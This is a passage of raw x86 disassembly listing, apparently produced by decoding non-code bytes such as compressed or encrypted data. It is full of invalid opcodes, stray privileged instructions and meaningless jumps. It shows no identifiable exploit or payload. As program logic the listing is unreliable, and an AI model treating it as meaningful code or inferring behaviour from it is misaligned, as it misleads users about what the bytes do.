  49472e:	or     edi,DWORD PTR [edx]
  494730:	lods   al,BYTE PTR ds:[esi]
  494731:	fiadd  DWORD PTR [ebx+ecx*1]
  494734:	dec    eax
  494735:	out    dx,al
  494736:	or     DWORD PTR [esi],0x618ebaf
  49473c:	and    eax,0x8c9a1c81
  494741:	dec    DWORD PTR [eax]
  494743:	or     eax,0xfd80e6ab
  494748:	sub    bl,BYTE PTR [ebp+0x10]
  49474b:	pop    ds
  49474c:	test   DWORD PTR [edx+edi*1],0x801621ee
  494753:	test   BYTE PTR [esp+eax*4],bl
  494756:	push   ecx
  494757:	fiadd  DWORD PTR [ebp+ebp*8-0x5389652a]
  49475e:	jb     0x494767
  494760:	sbb    ah,BYTE PTR [esi]
  494762:	jmp    0x49478e
  494764:	push   es
  494765:	and    eax,edx
  494767:	inc    esp
  494768:	add    dh,BYTE PTR [esi]
  49476a:	sbb    BYTE PTR [ebx+0x315093d],0x7b
  494771:	dec    esp
  494772:	inc    edx
  494773:	or     BYTE PTR [ebx],al
  494775:	ins    BYTE PTR es:[edi],dx
  494776:	(bad)  
  494777:	fld    DWORD PTR [ecx+0x50]
  49477a:	fstp   DWORD PTR [edi]
  49477c:	jmp    0x494783
  49477e:	fisttp QWORD PTR [ebx*8-0x7a7efde1]
  494785:	xor    DWORD PTR [esi],ecx
  494787:	arpl   WORD PTR [edi],bx
  494789:	adc    al,0x50
  49478b:	dec    eax
  49478c:	lods   eax,DWORD PTR ds:[esi]
  49478d:	add    al,0x2f
  49478f:	inc    ebx
  494790:	mov    esi,0xbc0cab06
  494795:	hlt    
  494796:	adc    al,0x84
  494798:	sub    cl,BYTE PTR [edi]
  49479a:	push   ebx
  49479b:	rcl    DWORD PTR [eax-0x292550e2],1
  4947a1:	pop    ecx
  4947a2:	sub    al,0xf7
  4947a4:	pusha  
  4947a5:	mov    esi,0x30cb3a48
  4947aa:	push   ebp
  4947ab:	jmp    0x4947cf
  4947ad:	adc    BYTE PTR [edx],cl
  4947af:	adc    al,al
  4947b1:	xor    edi,ebx
  4947b3:	mov    ds:0x8481533d,al
  4947b8:	es call 0x431:0x9012083a
  4947c0:	fld    TBYTE PTR [ebp+0x61]
  4947c3:	inc    edx
  4947c4:	push   ss
  4947c5:	sbb    DWORD PTR [ecx],ebx
  4947c7:	sbb    DWORD PTR [esi+0x1a37544f],ecx
  4947cd:	scas   eax,DWORD PTR es:[edi]
  4947ce:	int    0x82
  4947d0:	jmp    0x494834
  4947d2:	xor    BYTE PTR [esi+0x1b3219dc],dl
  4947d8:	sti    
  4947d9:	(bad)  
  4947db:	add    eax,0x5c4e6a8
  4947e0:	jnp    0x49482e
  4947e2:	jmp    0x49482c
  4947e4:	sub    ebx,DWORD PTR [edi]
  4947e6:	dec    esi
  4947e7:	push   cs
  4947e8:	in     al,dx
  4947e9:	lods   al,BYTE PTR ds:[esi]
  4947ea:	sub    al,0x35
  4947ec:	jmp    0x494820
  4947ee:	sub    edi,DWORD PTR [edx+0x1e]
  4947f1:	push   ds
  4947f2:	fst    QWORD PTR [esi+eiz*8+0xf980840]
  4947f9:	fst    DWORD PTR [ecx-0x535f5a1a]
  4947ff:	sbb    DWORD PTR [edx-0x2],eax
  494802:	test   al,0x2
  494804:	into   
  494805:	inc    edi
  494806:	(bad)  
  494807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494808:	call   0x502:0xae79c410
  49480f:	lds    eax,FWORD PTR [edx]
  494811:	ror    BYTE PTR [ebx+0x53b0a8f3],0x48
  494818:	or     al,BYTE PTR [ebx]
  49481a:	pop    ss
  49481b:	cmp    BYTE PTR ss:[edi+edx*8],bl
  49481f:	retf   0x20b0
  494822:	inc    di
  494824:	out    0x48,eax
  494826:	push   es
  494827:	loop   0x49482f
  494829:	retf   0x5ddd
  49482c:	in     al,dx
  49482d:	cwde   
  49482e:	xlat   BYTE PTR ds:[ebx]
  49482f:	outs   dx,DWORD PTR ds:[esi]
  494830:	mov    ds:0xf9452297,eax
  494835:	cwde   
  494836:	jge    0x494845
  494838:	mov    ds,edx
  49483a:	and    ecx,DWORD PTR [edx+0x5b]
  49483d:	in     al,dx
  49483e:	sbb    ah,0xd
  494841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494842:	jmp    0x494897
  494844:	test   ah,bl
  494846:	aaa    
  494847:	mov    edx,0x6344c012
  49484c:	inc    esi
  49484d:	rcr    DWORD PTR [edx-0x7d5327ef],cl
  494853:	cli    
  494854:	repnz test BYTE PTR [ebx-0x3fc8ad38],0x67
  49485c:	xchg   esi,eax
  49485d:	repnz mov eax,0x7dc83ba1
  494863:	iret   
  494864:	sub    eax,0x845e7593
  494869:	dec    esi
  49486a:	mov    esp,?
  49486c:	cli    
  49486d:	shl    DWORD PTR [esi-0x80],1
  494870:	sub    ebx,edx
  494872:	ins    DWORD PTR es:[edi],dx
  494873:	in     al,dx
  494874:	sbb    dh,al
  494876:	cmp    BYTE PTR [ecx+0x1cadec4d],al
  49487c:	loopne 0x494828
  49487e:	mov    WORD PTR [edx-0x5f1f6f10],cs
  494884:	or     BYTE PTR [edx+eiz*4+0x7ed9c55e],dh
  49488b:	push   eax
  49488c:	push   cs
  49488d:	pop    esp
  49488e:	jmp    0x4948e2
  494890:	pop    edi
  494891:	mov    bl,al
  494893:	mov    ch,0xa5
  494895:	hlt    
  494896:	mov    esi,eax
  494898:	inc    ebx
  494899:	loopne 0x4948b1
  49489b:	push   eax
  49489c:	push   0xfffffffd
  49489e:	cli    
  49489f:	call   0x11e0:0xe2fe4102
  4948a6:	and    BYTE PTR es:[ebx+ecx*1+0x6a],dh
  4948ab:	and    dh,al
  4948ad:	arpl   WORD PTR [edx],bx
  4948af:	add    al,BYTE PTR [edx]
  4948b1:	fcom   QWORD PTR [eax+eax*8+0x5d85218e]
  4948b8:	jnp    0x494848
  4948ba:	dec    eax
  4948bb:	inc    edi
  4948bc:	mov    ah,BYTE PTR [edi+ebx*8+0x30e1e7e]
  4948c3:	jg     0x4948dd
  4948c5:	gs push es
  4948c7:	inc    edx
  4948c8:	jecxz  0x4948f7
  4948ca:	aaa    
  4948cb:	sbb    DWORD PTR [ecx],esp
  4948cd:	pop    ecx
  4948ce:	mov    al,0x41
  4948d0:	loope  0x4948c3
  4948d2:	push   edi
  4948d3:	retf   0x6a04
  4948d6:	add    eax,0x9a1017eb
  4948db:	push   0x43
  4948dd:	icebp  
  4948de:	shl    edx,1
  4948e0:	sub    BYTE PTR [edx],al
  4948e2:	add    DWORD PTR [ecx+0xe],ecx
  4948e5:	rcr    ah,0x20
  4948e8:	push   0x3
  4948ea:	pop    eax
  4948eb:	dec    esi
  4948ec:	jmp    0x103:0xb2742508
  4948f3:	and    al,ah
  4948f5:	out    0xff,al
  4948f7:	sub    cl,BYTE PTR [edx+0xc]
  4948fa:	(bad)
  4948fd:	dec    ecx
  4948fe:	add    BYTE PTR [ebx],bh
  494900:	dec    ebp
  494901:	or     al,0x74
  494903:	fs sbb eax,0xa6f1ee7c
  494909:	in     al,0x9
  49490b:	test   eax,0x49e8d310
  494910:	jecxz  0x49491e
  494912:	push   ebp
  494913:	adc    al,0x80
  494915:	inc    esi
  494916:	nop
  494917:	pop    edx
  494918:	jmp    0x96655235
  49491d:	or     ch,BYTE PTR [esi]
  49491f:	sub    al,0xa8
  494921:	cmp    al,0xa4
  494923:	adc    DWORD PTR [esi-0x3c],eax
  494926:	push   ss
  494927:	out    0x24,eax
  494929:	push   0x50ff0d8
  49492e:	test   eax,0xc0e76a04
  494933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494934:	ret    
  494935:	sub    DWORD PTR [ecx-0x6ecac55],ecx
  49493b:	out    0x3,al
  49493d:	adc    cl,ah
  49493f:	fwait
  494940:	or     edi,DWORD PTR [esi-0x1e7ba696]
  494946:	test   DWORD PTR [ebp-0x3afba508],esi
  49494c:	(bad)  
  49494d:	fistp  DWORD PTR [ebx-0x1eba9a8f]
  494953:	fidiv  DWORD PTR [ebx]
  494955:	mov    BYTE PTR [ecx+0x46],cl
  494958:	and    BYTE PTR [eax+0x34],ch
  49495b:	adc    ebx,DWORD PTR [esi+0x13f00943]
  494961:	sub    BYTE PTR [edx+0x30a0c30],cl
  494967:	aad    0x69
  494969:	or     bl,ch
  49496b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49496c:	pusha  
  49496d:	jmp    0x49493b
  49496f:	imul   eax,DWORD PTR [edx],0xffffff89
  494972:	or     al,0x6c
  494974:	ins    DWORD PTR es:[edi],dx
  494975:	xor    BYTE PTR [ecx+0x4f],ah
  494978:	lea    edi,[esi+0x142db2cb]
  49497e:	out    dx,al
  49497f:	gs mov eax,0xbb3d14af
  494985:	pop    eax
  494986:	xchg   ecx,eax
  494987:	mov    edx,0x535b57e3
  49498c:	mov    ebx,esp
  49498e:	cmp    al,BYTE PTR [ebx+0x6680f0e4]
  494994:	add    DWORD PTR [ebx+0x46bbe2e],ebx
  49499a:	test   al,0x4
  49499c:	dec    edx
  49499d:	cld    
  49499e:	and    eax,0xff00758d
  4949a3:	jae    0x4949c5
  4949a5:	lea    eax,[ebx-0x52]
  4949a8:	scas   al,BYTE PTR es:[edi]
  4949a9:	cwde   
  4949aa:	pusha  
  4949ab:	xor    DWORD PTR [ebx+0x25],0xffffffbc
  4949af:	xchg   BYTE PTR [ecx-0x13f89dd],cl
  4949b5:	push   eax
  4949b6:	sbb    edi,edx
  4949b8:	sahf   
  4949b9:	out    0x2f,al
  4949bb:	adc    BYTE PTR ss:[esp+ecx*1],cl
  4949bf:	and    BYTE PTR [edx-0x32],al
  4949c2:	push   esp
  4949c3:	cli    
  4949c4:	adc    al,0xbc
  4949c6:	cmp    BYTE PTR [ecx-0x419ccf56],0x97
  4949cd:	mov    bh,0x34
  4949cf:	xchg   al,ah
  4949d1:	mov    edx,0xa0302b75
  4949d6:	fidivr WORD PTR [ecx]
  4949d8:	adc    DWORD PTR [eax+0x10437ddd],ebx
  4949de:	mov    WORD PTR [eax+0x64],ss
  4949e1:	cmp    BYTE PTR [eax+ecx*1+0x7b],al
  4949e5:	xchg   edi,eax
  4949e6:	add    al,BYTE PTR [esi+esi*2]
  4949e9:	and    BYTE PTR [edx],dl
  4949eb:	push   0x48756681
  4949f0:	lea    ecx,[ebx]
  4949f2:	out    0x43,al
  4949f4:	sbb    ch,ch
  4949f6:	mov    al,ds:0xbcdc2e70
  4949fb:	mov    esp,ebx
  4949fd:	pop    ebx
  4949fe:	imul   ebx,DWORD PTR [ebx+0x20bb7ddd],0x68
  494a05:	inc    eax
  494a06:	mov    edi,0xdb1c8b60
  494a0b:	loop   0x494a74
  494a0d:	inc    eax
  494a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494a0f:	lods   eax,DWORD PTR ds:[esi]
  494a10:	and    DWORD PTR [eax-0x27],eax
  494a13:	inc    ecx
  494a14:	xor    DWORD PTR [ecx+0x7b],0xf7bc23c5
  494a1b:	shl    BYTE PTR [esi+0x23],1
  494a1e:	xor    al,0x66
  494a20:	or     eax,ecx
  494a22:	es xor al,0xb0
  494a25:	sbb    esp,DWORD PTR ds:0xc6dd94a
  494a2b:	push   ebp
  494a2c:	push   ecx
  494a2d:	add    eax,0x3897217f
  494a32:	int3   
  494a33:	or     bl,bl
  494a35:	sub    eax,0xdb720ea8
  494a3a:	xchg   ecx,eax
  494a3b:	cdq    
  494a3c:	push   ds
  494a3d:	loope  0x494a9c
  494a3f:	or     BYTE PTR [ebx+0x349b10b0],bl
  494a45:	and    ebx,eax
  494a47:	sub    ch,ch
  494a49:	or     ch,BYTE PTR [esi]
  494a4b:	fwait
  494a4c:	sbb    BYTE PTR [esi+0x10],al
  494a4f:	mov    ah,0x23
  494a51:	loopne 0x494a11
  494a53:	or     ecx,DWORD PTR [edi+0x1e]
  494a56:	or     DWORD PTR [eax-0x18],edx
  494a59:	fdivrp st(1),st
  494a5b:	fstp   st(0)
  494a5d:	sbb    dh,al
  494a5f:	ret    
  494a60:	jmp    0xc931:0xebd9d076
  494a67:	data16 mov al,ds:0xe38107d2
  494a6d:	xchg   edx,eax
  494a6e:	rol    DWORD PTR ds:0xfb5e3188,0xe8
  494a75:	je     0x494acd
  494a77:	test   BYTE PTR [eax+0x74],0x48
  494a7b:	sbb    al,al
  494a7d:	xor    BYTE PTR [eax+eiz*8+0x7b],0x4d
  494a82:	loopne 0x494a86
  494a84:	sub    BYTE PTR [esi+0xb70855],0x2
  494a8b:	sbb    bl,0x9e
  494a8e:	push   esp
  494a8f:	cmp    eax,0x1d3dbec4
  494a94:	or     eax,0x59d61cee
  494a99:	add    BYTE PTR [ecx-0x46a0da7d],dh
  494a9f:	push   edx
  494aa0:	inc    ebx
  494aa1:	stc    
  494aa2:	add    BYTE PTR [ebx+0x61bf0865],al
  494aa8:	bound  edx,QWORD PTR [ebp-0x2c]
  494aab:	imul   eax,DWORD PTR [ecx+eiz*1-0x2d9e339b],0x34
  494ab3:	int    0x33
  494ab5:	push   ebx
  494ab6:	sbb    BYTE PTR [eax],bl
  494ab8:	adc    al,0x10
  494aba:	sub    ebp,DWORD PTR [edx-0x2ff3f336]
  494ac0:	inc    ecx
  494ac1:	inc    eax
  494ac2:	sub    ch,dl
  494ac4:	mov    bh,BYTE PTR [edx+0x32]
  494ac7:	push   esp
  494ac8:	popf   
  494ac9:	inc    ecx
  494aca:	adc    DWORD PTR ss:[esi+eiz*4+0x18],0x14
  494ad0:	adc    BYTE PTR [edi],al
  494ad2:	cmp    edx,esp
  494ad4:	adc    dl,BYTE PTR [eax+0x17656fd]
  494ada:	dec    esi
  494adb:	cwde   
  494adc:	cmp    al,0xa9
  494ade:	jns    0x494a6d
  494ae0:	push   ebp
  494ae1:	add    eax,0xd27494d8
  494ae6:	adc    edx,DWORD PTR [eax+0x3]
  494ae9:	das    
  494aea:	stc    
  494aeb:	stos   BYTE PTR es:[edi],al
  494aec:	and    al,BYTE PTR [ecx+eiz*8]
  494aef:	inc    eax
  494af0:	(bad)  
  494af1:	dec    ebp
  494af2:	clc    
  494af3:	lock jmp 0x494af9
  494af6:	in     eax,0x93
  494af8:	inc    eax
  494af9:	or     ebp,DWORD PTR [ecx+0x61fff730]
  494aff:	gs je  0x494b4a
  494b02:	jg     0x494a98
  494b04:	jb     0x494b7a
  494b06:	and    esi,DWORD PTR [edx+0x7e307a74]
  494b0c:	inc    eax
  494b0d:	out    0xc4,eax
  494b0f:	leave  
  494b10:	mov    ebx,0x8d0d0601
  494b15:	scas   eax,DWORD PTR es:[edi]
  494b16:	xor    BYTE PTR [eax],bl
  494b18:	adc    al,0xee
  494b1a:	add    ebx,ebp
  494b1c:	or     DWORD PTR [ebx+0x20948109],edi
  494b22:	dec    esi
  494b23:	rcl    BYTE PTR [ebx+edx*2],1
  494b26:	sub    DWORD PTR [edi+0x62],0x6657f0a3
  494b2d:	cld    
  494b2e:	(bad)  
  494b2f:	pushf  
  494b30:	jbe    0x494bb0
  494b32:	mov    ch,0xe2
  494b34:	lea    edi,[ecx+0x7f]
  494b37:	mov    edx,0x1c1e4000
  494b3c:	rcl    bl,0x2
  494b3f:	pop    eax
  494b40:	mov    dh,0x41
  494b42:	xchg   ebx,eax
  494b43:	jg     0x494b86
  494b45:	daa    
  494b46:	nop
  494b47:	push   esp
  494b48:	retf   0x1404
  494b4b:	jnp    0x494acd
  494b4d:	lock and ebp,esi
  494b50:	push   edx
  494b51:	dec    eax
  494b52:	je     0x494b97
  494b54:	push   eax
  494b55:	sub    eax,0x807e3508
  494b5a:	jo     0x494b66
  494b5c:	je     0x494b7f
  494b5e:	mov    BYTE PTR [ebp+0x382101a1],al
  494b64:	xchg   edi,eax
  494b65:	add    eax,0xbbcc85f3
  494b6a:	or     ebx,0xffffffaf
  494b6d:	std    
  494b6e:	std    
  494b6f:	or     BYTE PTR [esi-0x20f44f3d],dh
  494b75:	or     eax,0x3c40c3f6
  494b7a:	lods   eax,DWORD PTR ds:[esi]
  494b7b:	das    
  494b7c:	mov    edx,0x4096941c
  494b81:	inc    ebx
  494b82:	cmp    DWORD PTR [edx+0x69a74203],ebp
  494b88:	add    dl,BYTE PTR [eax+0x589b83b2]
  494b8e:	ret    0xfee3
  494b91:	sub    BYTE PTR [edx+0x2],cl
  494b94:	or     eax,edi
  494b96:	(bad)  
  494b97:	test   BYTE PTR ds:[eax+0x7572557a],0x74
  494b9f:	scas   eax,DWORD PTR es:[edi]
  494ba0:	and    bl,ch
  494ba2:	outs   dx,BYTE PTR ds:[esi]
  494ba3:	cmp    BYTE PTR [eax],bh
  494ba5:	mov    esp,0x7454eadd
  494baa:	pop    edx
  494bab:	or     BYTE PTR [esi],cl
  494bad:	je     0x494bf4
  494baf:	dec    eax
  494bb0:	push   cs
  494bb1:	sub    BYTE PTR ds:0x1b5aa5c5,dl
  494bb7:	xchg   edi,eax
  494bb8:	sbb    DWORD PTR [ebx+eax*8],edi
  494bbb:	in     al,0xd5
  494bbd:	dec    ebp
  494bbe:	sti    
  494bbf:	daa    
  494bc0:	pusha  
  494bc1:	inc    ebp
  494bc2:	or     ebx,edx
  494bc4:	jmp    0x494c0d
  494bc6:	jo     0x494bbc
  494bc8:	cmp    eax,DWORD PTR [ecx+0x113b1465]
  494bce:	add    DWORD PTR [ebp-0x41],eax
  494bd1:	retf   0xeb19
  494bd4:	xor    DWORD PTR [ebx],ebp
  494bd6:	sbb    bl,bh
  494bd8:	xchg   ch,bh
  494bda:	and    eax,0x23fc5509
  494bdf:	pop    ds
  494be0:	adc    DWORD PTR [bx+di+0x56cb],eax
  494be5:	das    
  494be6:	or     bl,BYTE PTR [ebx]
  494be8:	dec    ecx
  494be9:	(bad)  
  494beb:	mov    bh,0xd8
  494bed:	xor    DWORD PTR [eax-0x3689ea7e],ecx
  494bf3:	jmp    0x494c03
  494bf5:	fdiv   DWORD PTR [ebx+0x2a6b8f03]
  494bfb:	int3   
  494bfc:	fcomp  QWORD PTR [esi-0x3b]
  494bff:	and    ebp,esp
  494c01:	or     al,0x67
  494c03:	test   BYTE PTR [eax+0x2f5f20cc],ah
  494c09:	sar    DWORD PTR [ebx+0x3e393c29],1
  494c0f:	je     0x494c75
  494c11:	push   esi
  494c12:	push   0xe4513ab4
  494c17:	aaa    
  494c18:	aaa    
  494c19:	cmc    
  494c1a:	and    bl,BYTE PTR [esi+0x2b]
  494c1d:	mov    BYTE PTR [eax-0x7d],cl
  494c20:	mov    BYTE PTR [esi],0xbd
  494c23:	(bad)  
  494c24:	jge    0x494bb7
  494c26:	cmp    BYTE PTR ds:0x5657575,0x68
  494c2d:	mov    esp,0xd0615662
  494c32:	inc    esi
  494c33:	jle    0x494c73
  494c35:	and    al,0x1b
  494c37:	or     esi,DWORD PTR [esi]
  494c39:	or     cl,BYTE PTR [esi+eiz*4]
  494c3c:	jbe    0x494c22
  494c3e:	xor    BYTE PTR [esi-0x4e],dl
  494c41:	repnz enter 0x103d,0x73
  494c46:	and    edi,ebx
  494c48:	push   esp
  494c49:	add    ah,BYTE PTR [edx]
  494c4b:	push   0x7
  494c4d:	push   0x3af71bdc
  494c52:	add    al,0x4a
  494c54:	push   cs
  494c55:	lods   al,BYTE PTR ds:[esi]
  494c56:	pop    edi
  494c57:	xor    edi,edi
  494c59:	fadd   DWORD PTR [eax+0x3a]
  494c5c:	jne    0x494cb7
  494c5e:	mov    bl,0x1c
  494c60:	push   0x584a3aa2
  494c65:	mov    cs,WORD PTR [ebx+0x3772960c]
  494c6b:	cmc    
  494c6c:	cmp    ch,BYTE PTR [eax+0x6ff51b02]
  494c72:	arpl   WORD PTR [ecx],sp
  494c74:	inc    esi
  494c75:	push   0x6
  494c77:	inc    ebp
  494c78:	adc    al,0xbd
  494c7a:	push   esp
  494c7b:	and    eax,DWORD PTR [edx]
  494c7d:	scas   eax,DWORD PTR es:[edi]
  494c7e:	outs   dx,BYTE PTR ds:[esi]
  494c7f:	pop    eax
  494c80:	imul   BYTE PTR [ecx]
  494c82:	adc    esp,DWORD PTR [ebx+0x31]
  494c85:	dec    BYTE PTR [ecx-0x6afb07c8]
  494c8b:	sub    al,0xa8
  494c8d:	adc    ecx,DWORD PTR [ecx+esi*2+0x1d68e05a]
  494c94:	push   ebp
  494c95:	sar    BYTE PTR ds:0x903951db,0xa1
  494c9c:	mov    dl,0xc7
  494c9e:	pop    ebp
  494c9f:	retf   0x230a
  494ca2:	jne    0x494cd0
  494ca4:	sbb    BYTE PTR [ebx+0x30],0x39
  494ca8:	mov    esi,0x487a03c3
  494cad:	test   eax,0x8d4175ed
  494cb2:	inc    esi
  494cb3:	std    
  494cb4:	call   0x35f49acd
  494cb9:	cmp    dl,BYTE PTR [edx]
  494cbb:	push   cs
  494cbc:	adc    BYTE PTR [ebp-0x6c3d3554],cl
  494cc2:	add    eax,0xbc2cbb4f
  494cc7:	sub    al,0x18
  494cc9:	or     eax,0xb2f0041
  494cce:	inc    edi
  494ccf:	idiv   dh
  494cd1:	dec    eax
  494cd2:	pop    edi
  494cd3:	gs jge 0x494d1c
  494cd6:	jmp    0x494c69
  494cd8:	and    ah,0xeb
  494cdb:	arpl   WORD PTR [edx+0x38],bp
  494cde:	test   esi,ebp
  494ce0:	data16 mov dh,0x2f
  494ce3:	or     eax,0xb1048953
  494ce8:	mov    dl,0x40
  494cea:	popa   
  494ceb:	push   ss
  494cec:	inc    esp
  494ced:	dec    esi
  494cee:	mov    bl,0x75
  494cf0:	sti    
  494cf1:	test   DWORD PTR [edx+0x27c3a430],eax
  494cf7:	jne    0x494d0c
  494cf9:	shl    dh,0x2f
  494cfc:	add    DWORD PTR [ecx-0x4fe3969f],eax
  494d02:	jmp    0x494d1f
  494d04:	push   ecx
  494d05:	pop    es
  494d06:	rcr    cl,1
  494d08:	cmp    DWORD PTR [esi*2+0x5f2cb03c],esp
  494d0f:	sbb    al,0x25
  494d11:	fsub   QWORD PTR [ecx-0x7ee9cff4]
  494d17:	addr16 add eax,0xca207b7a
  494d1d:	sbb    bl,BYTE PTR [ecx+ecx*4]
  494d20:	pop    ds
  494d21:	or     BYTE PTR [ebx+eax*4],bl
  494d24:	dec    edi
  494d25:	adc    BYTE PTR [ecx],ah
  494d27:	xchg   edi,eax
  494d28:	ds pop ebp
  494d2a:	pextrw esi,mm7,0x8b
  494d2e:	(bad)  
  494d2f:	or     eax,0xb103ae26
  494d34:	sub    eax,0x7057bf9c
  494d39:	loope  0x494cea
  494d3b:	mov    ebx,0x18c01475
  494d40:	push   ebp
  494d41:	push   edx
  494d42:	in     al,dx
  494d43:	pop    es
  494d44:	push   esi
  494d45:	adc    ch,BYTE PTR [eax]
  494d47:	dec    esi
  494d48:	(bad)  
  494d49:	addr16 popf 
  494d4b:	sahf   
  494d4c:	mov    ebx,0x89c43a9a
  494d51:	jl     0x494db7
  494d53:	mov    DWORD PTR ds:0xc305423,esp
  494d59:	jecxz  0x494d02
  494d5b:	mov    dl,0xf2
  494d5d:	pop    edx
  494d5e:	sub    al,0x33
  494d60:	sbb    esi,esi
  494d62:	fild   DWORD PTR [eax+0x40]
  494d65:	and    dh,BYTE PTR cs:[ebx+edi*1-0x7a]
  494d6a:	xor    al,0x83
  494d6c:	cli    
  494d6d:	adc    BYTE PTR [eax+0x4ffed17],cl
  494d73:	cmp    esi,edx
  494d75:	jbe    0x494da5
  494d77:	lea    esi,[esi+esi*2]
  494d7a:	lea    ebx,[ebx+esi*4-0x5a]
  494d7e:	or     ebp,DWORD PTR [eax-0x7d]
  494d81:	jnp    0x494d43
  494d83:	pop    edx
  494d84:	inc    eax
  494d85:	adc    DWORD PTR [esi-0x34],ebx
  494d88:	lock popa 
  494d8a:	test   ebp,0x1dc24e53
  494d90:	xor    DWORD PTR [ecx-0x7e3ae6ea],edi
  494d96:	or     al,0xf8
  494d98:	push   eax
  494d99:	jmp    0x494d4b
  494d9b:	fs (bad) 
  494d9d:	pop    eax
  494d9e:	hlt    
  494d9f:	sbb    BYTE PTR [esi-0x3bae27f8],bl
  494da5:	ret    
  494da6:	fild   WORD PTR [ecx+0x4]
  494da9:	loopne 0x494e11
  494dab:	fsub   st(6),st
  494dad:	(bad)  
  494dae:	mov    eax,0xde33744f
  494db3:	or     al,0x8
  494db5:	xor    ecx,eax
  494db7:	test   al,0xd9
  494db9:	inc    ebp
  494dba:	js     0x494e2c
  494dbc:	fsubr  QWORD PTR [eax+0x18]
  494dbf:	(bad)  
  494dc0:	call   0x7385dc9
  494dc5:	or     eax,DWORD PTR [edx-0x3e]
  494dc8:	mov    DWORD PTR [ebp+0x47],ebx
  494dcb:	lods   eax,DWORD PTR ds:[esi]
  494dcc:	xchg   edi,eax
  494dcd:	mov    al,ds:0x2898c07
  494dd2:	popf   
  494dd3:	ret    
  494dd4:	dec    edx
  494dd5:	dec    esp
  494dd6:	arpl   WORD PTR [ecx+ebp*2-0xd6df81],bp
  494ddd:	jno    0x494dfb
  494ddf:	add    al,0x18
  494de1:	sub    BYTE PTR [ecx-0x1f],dl
  494de4:	inc    eax
  494de5:	jmp    0x1d858c32
  494dea:	mov    BYTE PTR [ebx+0x28],0xc4
  494dee:	pop    eax
  494def:	and    BYTE PTR [ebx],dh
  494df1:	push   edx
  494df2:	dec    ebx
  494df3:	mov    ds:0x635be05b,al
  494df8:	jmp    0xc1aa:0x10a1c0df
  494dff:	inc    edi
  494e00:	inc    esp
  494e01:	cmp    ecx,ecx
  494e03:	lea    eax,[ebx-0x2dcc30ff]
  494e09:	out    0x2e,al
  494e0b:	dec    eax
  494e0c:	(bad)  
  494e0d:	xlat   BYTE PTR ds:[ebx]
  494e0e:	jo     0x494db3
  494e10:	mov    dh,0x68
  494e12:	inc    esi
  494e13:	xlat   BYTE PTR ds:[ebx]
  494e14:	sub    al,0x51
  494e16:	ds dec ecx
  494e18:	or     ah,BYTE PTR [eax+eiz*8-0x377fc865]
  494e1f:	ins    BYTE PTR es:[edi],dx
  494e20:	push   edx
  494e21:	push   ecx
  494e22:	push   DWORD PTR [esp+0x11]
  494e26:	push   esi
  494e27:	pop    ecx
  494e28:	fwait
  494e29:	dec    eax
  494e2a:	or     edi,ebp
  494e2c:	adc    bl,BYTE PTR [edi]
  494e2e:	test   BYTE PTR [ebp-0x5eaf0762],ah
  494e34:	mov    ah,0x83
  494e36:	icebp  
  494e37:	cmp    esi,DWORD PTR [ecx-0x2]
  494e3a:	add    DWORD PTR [ebp+0x9],esi
  494e3d:	test   BYTE PTR [eax-0x5df4ef34],0x3a
  494e44:	mov    gs,WORD PTR [eax]
  494e46:	add    BYTE PTR [edx+eax*4],bl
  494e49:	inc    esp
  494e4a:	call   0x26a:0x66adec39
  494e51:	push   ebp
  494e52:	cli    
  494e53:	jl     0x494ebc
  494e55:	pop    ecx
  494e56:	jb     0x494e90
  494e58:	mov    ch,0x10
  494e5a:	cmp    bl,BYTE PTR [esi+edx*2]
  494e5d:	pop    ds
  494e5e:	or     al,0x23
  494e60:	(bad)  
  494e61:	mul    DWORD PTR [ebp+0x3b310aa5]
  494e67:	arpl   WORD PTR [edi+0x3d],cx
  494e6a:	adc    DWORD PTR [edi+0x6d],eax
  494e6d:	mov    cl,0xcb
  494e6f:	add    eax,DWORD PTR [ebp-0x39a61ed6]
  494e75:	pop    esp
  494e76:	add    ch,al
  494e78:	dec    ecx
  494e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494e7a:	add    DWORD PTR [edx+0x12e90287],0xe096911e
  494e84:	adc    al,BYTE PTR [edx-0x7c]
  494e87:	sbb    al,0xc8
  494e89:	lods   eax,DWORD PTR ds:[esi]
  494e8a:	adc    edx,DWORD PTR [ebp+0x20]
  494e8d:	test   BYTE PTR [ebx-0x37eea139],0xb8
  494e94:	sub    BYTE PTR [eax+edx*4-0x2c2f0a4a],al
  494e9b:	cmp    esi,DWORD PTR [ecx+0x74]
  494e9e:	push   ds
  494e9f:	dec    esp
  494ea0:	sbb    bh,bh
  494ea2:	jbe    0x494eac
  494ea4:	jae    0x494eaf
  494ea6:	push   ds
  494ea7:	xor    BYTE PTR [edx+ebx*1-0x2c],bl
  494eab:	fadd   DWORD PTR [ebp-0x4d5fbbc3]
  494eb1:	push   es
  494eb2:	(bad)  
  494eb4:	pop    esi
  494eb5:	push   ebp
  494eb6:	adc    DWORD PTR [edi],eax
  494eb8:	mov    bh,0x9d
  494eba:	adc    eax,0xd54e903f
  494ebf:	cmp    ecx,edx
  494ec1:	or     edx,DWORD PTR [ebx+0x521defd2]
  494ec7:	ja     0x494e68
  494ec9:	nop
  494eca:	out    0xf,eax
  494ecc:	add    dh,BYTE PTR [ebx+ecx*1+0x6f]
  494ed0:	cmc    
  494ed1:	xchg   ecx,eax
  494ed2:	cmp    ch,ch
  494ed4:	inc    ebx
  494ed5:	adc    al,0x1
  494ed7:	or     DWORD PTR gs:[edx+0x66],eax
  494edb:	and    esp,DWORD PTR [ebx]
  494edd:	sbb    esp,DWORD PTR [edx+0x1b5c2c18]
  494ee3:	nop
  494ee4:	neg    BYTE PTR [eax]
  494ee6:	cld    
  494ee7:	in     eax,dx
  494ee8:	add    al,0x98
  494eea:	pop    esi
  494eeb:	mov    bh,0xf4
  494eed:	jns    0x494e7a
  494eef:	mov    ecx,0x4d0f304a
  494ef4:	cmp    BYTE PTR [esi-0x7e],0x75
  494ef8:	push   ecx
  494ef9:	ins    DWORD PTR es:[edi],dx
  494efa:	sbb    ch,bl
  494efc:	adc    DWORD PTR [ebx],ebp
  494efe:	xor    BYTE PTR [edi],dl
  494f00:	jb     0x494f26
  494f02:	push   edi
  494f03:	ret    0xf0db
  494f06:	nop
  494f07:	sbb    DWORD PTR [esi+0x521f9956],edx
  494f0d:	pop    edi
